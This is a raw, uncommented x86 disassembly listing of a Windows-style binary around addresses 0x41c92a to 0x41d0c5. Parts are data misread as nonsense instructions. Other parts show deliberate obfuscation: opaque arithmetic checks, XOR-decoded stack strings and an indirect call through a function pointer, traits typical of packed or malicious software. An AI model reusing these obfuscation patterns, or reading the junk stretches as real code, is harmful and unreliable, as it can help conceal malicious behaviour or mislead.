  41c92a:	ret    0xfec6
  41c92d:	retf   
  41c92e:	fist   WORD PTR [edx+0x66]
  41c931:	in     eax,0x6b
  41c933:	jl     0x41c8ec
  41c935:	mov    ecx,0xfe8722d7
  41c93a:	add    BYTE PTR [esi+0x2d],dh
  41c93d:	ins    BYTE PTR es:[edi],dx
  41c93e:	aad    0x9d
  41c940:	leave  
  41c941:	sub    al,0xcc
  41c943:	fistp  WORD PTR [ebp+ebp*4-0x3e8f2894]
  41c94a:	jb     0x41c963
  41c94c:	outs   dx,BYTE PTR ds:[esi]
  41c94d:	pop    esi
  41c94e:	add    eax,0x1be8547e
  41c953:	aam    0x68
  41c955:	imul   DWORD PTR ds:0xf6cb032d
  41c95b:	add    eax,0x9a1d5d1c
  41c960:	ins    DWORD PTR es:[edi],dx
  41c961:	pop    ss
  41c962:	mov    dl,0x4a
  41c964:	mov    eax,0x60b69245
  41c969:	rcl    al,cl
  41c96b:	jo     0x41c9cc
  41c96d:	push   0xffffffbb
  41c96f:	mov    edi,0xc63a605c
  41c974:	pop    esp
  41c975:	mov    esi,0x68a51ac
  41c97a:	mov    ebx,0xd5d75d3
  41c97f:	xor    cl,cl
  41c981:	dec    esp
  41c982:	mov    bh,0xad
  41c984:	cli    
  41c985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c986:	mov    ebp,0xd5203ec5
  41c98b:	arpl   WORD PTR [edi],dx
  41c98d:	pop    ss
  41c98e:	loop   0x41c950
  41c990:	inc    ebp
  41c991:	out    0x8,al
  41c993:	xor    al,0xc5
  41c995:	or     DWORD PTR fs:[edi],esp
  41c998:	mov    BYTE PTR [esi-0x6],dh
  41c99b:	mov    esi,?
  41c99d:	ins    BYTE PTR es:[edi],dx
  41c99e:	iret   
  41c99f:	retf   0xc580
  41c9a2:	inc    edi
  41c9a3:	mov    WORD PTR [ebx],es
  41c9a5:	and    eax,0xad6a6601
  41c9aa:	push   ebx
  41c9ab:	jns    0x41c9b6
  41c9ad:	pop    ebx
  41c9ae:	bound  esi,QWORD PTR [edx]
  41c9b0:	aaa    
  41c9b1:	daa    
  41c9b2:	pushf  
  41c9b3:	repz xchg ecx,eax
  41c9b5:	jmp    FWORD PTR [edi-0x1a]
  41c9b8:	fdivr  DWORD PTR [eax-0x20f38a63]
  41c9be:	jo     0x41c9db
  41c9c0:	mov    ds:0x5f888619,eax
  41c9c5:	addr16 mov esp,0x846b8ca2
  41c9cb:	mov    ch,0x21
  41c9cd:	repz mov esp,0x2c30c7ab
  41c9d3:	sub    eax,0x7ccb8fef
  41c9d8:	shrd   DWORD PTR [edx],esi,0x33
  41c9dc:	jmp    0x41ca0a
  41c9de:	lds    edx,FWORD PTR ds:0xc5fe05c2
  41c9e4:	ins    BYTE PTR es:[edi],dx
  41c9e5:	leave  
  41c9e6:	add    eax,0xfd374bb5
  41c9eb:	or     ecx,ebx
  41c9ed:	dec    ecx
  41c9ee:	loope  0x41c9c6
  41c9f0:	call   0x1881:0xa650b981
  41c9f7:	cmp    eax,0xab0de6c2
  41c9fc:	stos   DWORD PTR es:[edi],eax
  41c9fd:	jae    0x41ca7c
  41c9ff:	push   eax
  41ca00:	(bad)  
  41ca01:	cld    
  41ca02:	loop   0x41ca5b
  41ca04:	add    DWORD PTR [edx+0x616c6b5a],ecx
  41ca0a:	mov    esp,0x2578539b
  41ca0f:	pop    esp
  41ca10:	jno    0x41ca35
  41ca12:	into   
  41ca13:	add    DWORD PTR [edi],ecx
  41ca15:	std    
  41ca16:	rcr    BYTE PTR [esi+edx*4+0x78],cl
  41ca1a:	stos   BYTE PTR es:[edi],al
  41ca1b:	into   
  41ca1c:	mov    ds:0x2da0d742,al
  41ca21:	push   0x5dba29a8
  41ca26:	popf   
  41ca27:	les    esi,FWORD PTR [edx+0x318527d6]
  41ca2d:	mov    esi,0xc0eb4901
  41ca32:	mov    edi,0xa241587a
  41ca37:	adc    dh,bh
  41ca39:	push   edi
  41ca3a:	inc    edi
  41ca3b:	xor    al,0x4b
  41ca3d:	pop    esp
  41ca3e:	cmp    dh,BYTE PTR [eax+0x73eb1dc7]
  41ca44:	push   ecx
  41ca45:	sub    esp,DWORD PTR [ebx]
  41ca47:	add    BYTE PTR [edx+0x4cc1ce4e],ch
  41ca4d:	add    eax,0x9faa329b
  41ca52:	nop
  41ca53:	(bad)  
  41ca54:	push   ds
  41ca55:	pop    ss
  41ca56:	stos   BYTE PTR es:[edi],al
  41ca57:	mov    ds:0xf36646ab,eax
  41ca5c:	fnsetpm(287 only) 
  41ca5e:	ds mov ecx,?
  41ca61:	xchg   edx,eax
  41ca62:	test   ebx,esp
  41ca64:	add    al,bl
  41ca66:	test   al,0x7d
  41ca68:	inc    ecx
  41ca69:	nop
  41ca6a:	pop    esp
  41ca6b:	gs inc ecx
  41ca6d:	call   0xb1a7:0x7b3991f6
  41ca74:	lahf   
  41ca75:	pop    edx
  41ca76:	in     eax,dx
  41ca77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca78:	rep lods eax,DWORD PTR ds:[esi]
  41ca7a:	pop    esi
  41ca7b:	or     esi,DWORD PTR [edi-0x4a874a67]
  41ca81:	pushf  
  41ca82:	loopne 0x41ca5e
  41ca84:	(bad)  
  41ca85:	mov    bh,0x10
  41ca87:	rcr    DWORD PTR [edi],0x9a
  41ca8a:	leave  
  41ca8b:	gs cli 
  41ca8d:	mov    bl,0xa9
  41ca8f:	push   ebx
  41ca90:	sub    dh,ch
  41ca92:	rcl    BYTE PTR [ebp+esi*2+0x3f1fad97],cl
  41ca99:	cli    
  41ca9a:	js     0x41ca20
  41ca9c:	adc    eax,0xf6f6d9eb
  41caa1:	push   0x3d8af204
  41caa6:	push   ebp
  41caa7:	mov    edi,0x563c2c2a
  41caac:	sub    al,0xf1
  41caae:	xchg   ch,ch
  41cab0:	dec    ecx
  41cab1:	pop    esi
  41cab2:	and    BYTE PTR [edx+0xd],dl
  41cab5:	fs inc esi
  41cab7:	je     0x41caed
  41cab9:	lds    esi,FWORD PTR [ebx]
  41cabb:	mov    edi,0x40f75640
  41cac0:	mov    bh,0x43
  41cac2:	retf   
  41cac3:	(bad)  
  41cac4:	outs   dx,BYTE PTR ds:[esi]
  41cac5:	inc    edx
  41cac6:	push   es
  41cac7:	and    BYTE PTR [ebx-0x34],ah
  41caca:	daa    
  41cacb:	cdq    
  41cacc:	dec    edx
  41cacd:	adc    BYTE PTR [edx],0x19
  41cad0:	inc    ebx
  41cad1:	mov    fs,WORD PTR [ebp+edx*4+0x51]
  41cad5:	pop    edi
  41cad6:	retf   0x9193
  41cad9:	scas   eax,DWORD PTR es:[edi]
  41cada:	loopne 0x41caa8
  41cadc:	push   esp
  41cadd:	bound  ecx,QWORD PTR [esi+ebx*2]
  41cae0:	and    ecx,DWORD PTR [esi-0x24]
  41cae3:	xchg   ebp,eax
  41cae4:	in     al,dx
  41cae5:	sub    DWORD PTR [edx+eiz*8-0x25],ecx
  41cae9:	mov    ebp,0xb62e89ef
  41caee:	fcomp  st(7)
  41caf0:	push   ds
  41caf1:	jge    0x41cb34
  41caf3:	lods   al,BYTE PTR ds:[esi]
  41caf4:	sub    dl,bl
  41caf6:	shl    cl,1
  41caf8:	cdq    
  41caf9:	dec    esp
  41cafa:	addr16 ret 
  41cafc:	iret   
  41cafd:	push   0xffffffda
  41caff:	mov    eax,ds:0x4fcd54d1
  41cb04:	loope  0x41cb23
  41cb06:	add    ebx,esi
  41cb08:	add    DWORD PTR [eax-0x4f],0x1d44da0e
  41cb0f:	std    
  41cb10:	loop   0x41cb4e
  41cb12:	les    eax,FWORD PTR [edx]
  41cb14:	adc    DWORD PTR [esp+eiz*8-0x7f56fad7],0x4074aa56
  41cb1f:	sub    al,0x35
  41cb21:	mov    al,0xcd
  41cb23:	and    edi,DWORD PTR [eax+0x2b1a2cbc]
  41cb29:	cld    
  41cb2a:	daa    
  41cb2b:	loopne 0x41cb6a
  41cb2d:	cli    
  41cb2e:	xor    BYTE PTR [ebx+0x68127ca7],ah
  41cb34:	std    
  41cb35:	xchg   ecx,eax
  41cb36:	mov    eax,0x89998f0c
  41cb3b:	int    0x63
  41cb3d:	inc    eax
  41cb3e:	cmp    DWORD PTR [eax+0x7f],edi
  41cb41:	test   al,0xa
  41cb43:	xchg   ebp,eax
  41cb44:	add    dl,0x94
  41cb47:	push   edi
  41cb48:	sub    BYTE PTR [eax],cl
  41cb4a:	ds sti 
  41cb4c:	popf   
  41cb4d:	add    eax,DWORD PTR [edi]
  41cb4f:	(bad)  
  41cb50:	retf   
  41cb51:	imul   eax,DWORD PTR [eax-0x27],0x4ed519ab
  41cb58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb59:	or     al,0xcc
  41cb5b:	sub    cl,ah
  41cb5d:	loopne 0x41cb70
  41cb5f:	das    
  41cb60:	or     BYTE PTR [edi+0x23],dh
  41cb63:	ror    DWORD PTR [ecx+0x558bb455],cl
  41cb69:	or     BYTE PTR [ebx-0x6b7247a3],cl
  41cb6f:	adc    ebx,DWORD PTR [edi]
  41cb71:	cld    
  41cb72:	inc    ecx
  41cb73:	add    cl,BYTE PTR [ecx+0x558bb855]
  41cb79:	or     BYTE PTR [ebx-0x5a1ea1e],bh
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	pop    esp
  41ce45:	mov    eax,0x972bb3d4
  41ce4a:	(bad)  
  41ce4b:	dec    esi
  41ce4c:	mov    esi,0x34011f46
  41ce51:	mov    eax,0x1ed54
  41ce56:	add    BYTE PTR [eax],al
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
